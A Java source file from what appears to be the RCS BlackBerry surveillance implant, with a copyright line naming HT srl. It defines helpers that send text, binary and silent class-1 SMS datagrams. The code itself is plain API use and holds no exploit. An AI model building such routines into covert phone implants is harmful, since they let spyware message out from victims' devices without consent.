//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.sms
 * File         : SMSHelper.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.io.SmsAddress;
import net.rim.device.api.system.SMSPacketHeader;
import net.rim.device.api.system.SMSParameters;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class SMSHelper {
    //#ifdef DEBUG
    static Debug debug = new Debug("SMSHelper", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private static final int MAX_LEN_UCS2 = 70;
    private static final int MAX_LEN_8BIT = 70;

    public static boolean sendSMSText(final String number, final String message) {

        //#ifdef DEBUG
        debug.info("Sending sms Message to: " + number + " message:" + message); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif
        try {
            final MessageConnection conn = (MessageConnection) Connector
                    .open(Messages.getString("6.0")); //$NON-NLS-1$
            // generate a new text message
            final TextMessage tmsg = (TextMessage) conn
                    .newMessage(MessageConnection.TEXT_MESSAGE);
            // set the message text and the address
            tmsg.setAddress(Messages.getString("6.1") + number); //$NON-NLS-1$

            tmsg.setPayloadText(message);
            // finally send our message

            conn.send(tmsg);
        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send message sms to: " + number + " ex:" + e); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            return false;
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send message sms to: " + number + " ex:" + e); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            return false;
        }
        return true;
    }

    public static boolean sendSMSBinary(final String number,
            final String message) {

        //#ifdef DEBUG
        debug.info("Sending sms Message to: " + number + " message:" + message); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif
        try {
            final MessageConnection conn = (MessageConnection) Connector
                    .open(Messages.getString("6.11")); //$NON-NLS-1$
            // generate a new text message
            final BinaryMessage bmsg = (BinaryMessage) conn
                    .newMessage(MessageConnection.BINARY_MESSAGE);
            // set the message text and the address
            bmsg.setAddress(Messages.getString("6.12") + number); //$NON-NLS-1$

            //tmsg.getAddress();
            //SMSPacketHeader smsPacketHeader = smsAddress.getHeader(); 

            bmsg.setPayloadData(message.getBytes("UTF-8")); //$NON-NLS-1$
            // finally send our message

            conn.send(bmsg);
        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send message sms to: " + number + " ex:" + e); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            return false;
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send message sms to: " + number + " ex:" + e); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            return false;
        }
        return true;
    }

    //http://stackoverflow.com/questions/4932947/sending-sms-problem-from-blackberry-device
    public static boolean sendSMSDatagram(final String number,
            final String message) {

        //#ifdef DEBUG
        debug.info("Sending sms Datagram to: " + number + " message:" //$NON-NLS-1$ //$NON-NLS-2$
                + message);
        //#endif
        
        DatagramConnection conn;
        try {
            conn = (DatagramConnection) Connector
                    .open(Messages.getString("6.20") + number); //$NON-NLS-1$

            final SmsAddress destinationAddr = new SmsAddress("//" + number); //$NON-NLS-1$
            final SMSPacketHeader header = destinationAddr.getHeader();
            // no need for the report
            header.setStatusReportRequest(false);
            // we are going to use the UDH
            header.setUserDataHeaderPresent(true);
            // setting the validity and delivery periods
            header.setValidityPeriod(SMSParameters.PERIOD_INDEFINITE);
            header.setDeliveryPeriod(SMSParameters.PERIOD_INDEFINITE);
            // setting the message class
            header.setMessageClass(SMSParameters.MESSAGE_CLASS_1);
            // setting the message encoding - we are going to send UTF-8 characters so
            // it has to be 8-bit
            header.setMessageCoding(SMSParameters.MESSAGE_CODING_8_BIT);

            final byte[] data = message.getBytes("UTF-8"); //$NON-NLS-1$

            final Datagram dg = conn.newDatagram(conn.getMaximumLength());
            dg.setData(data, 0, Math.min(data.length, MAX_LEN_8BIT));
            conn.send(dg);

        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send Datagram sms to: " + number + " ex:" + e); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            return false;
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send Datagram sms to: " + number + " ex:" + e); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            return false;
        }finally{  
            try {
                conn.close();
            } catch (IOException e) {
                //#ifdef DEBUG
                debug.error("sendSMSDatagram: " + e);
                //#endif
            }
        }
        return true;
    }
}
